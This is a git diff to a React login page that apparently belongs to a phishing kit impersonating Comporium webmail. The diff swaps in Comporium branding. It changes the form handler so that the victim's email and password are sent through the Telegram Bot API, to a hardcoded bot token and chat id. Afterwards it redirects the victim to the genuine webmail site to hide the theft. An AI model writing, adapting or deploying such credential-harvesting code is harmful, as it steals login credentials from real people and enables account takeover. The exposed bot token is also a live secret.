@@ -5,6 +5,7 @@ import logo from './logo.png';
 
 import { useState } from 'react';
 import axios from 'axios';
+import comporium from './comporium.png';
 
 function Home(){
 
@@ -12,7 +13,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("CValley")
+    const[platform, setPlatform] = useState("Comporium")
 
     const[showError, setShowError] = useState(false);
 
@@ -21,19 +22,26 @@ function Home(){
 
 
         try {
-            const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
-                email:email,
-                password:password,
-                platform:platform
-            });
+            // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
+            //     email:email,
+            //     password:password,
+            //     platform:platform
+            // });
+    
+           const response =  await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+                chat_id: 5868304053,
+                text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
+              });
+    
         
             // Handle success
-            console.log('Data sent:', response.data.message);
+         
     
             if(response.status == 200){
-                console.log(response.data.message);
+               // console.log(response.data.message);
     
-                setShowError(true);
+              
+               window.location.href = 'https://webmail.comporium.net/';
             }
           } catch (error) {
             // Handle error
@@ -58,7 +66,7 @@ function Home(){
 
             <div className='secondiv col-md-5 m-auto'>
                 <div className='logodiv text-center'>
-                <img src={logo} className="mylogo" />
+                <img src={comporium} className="mylogo" />
 
                 </div>
 
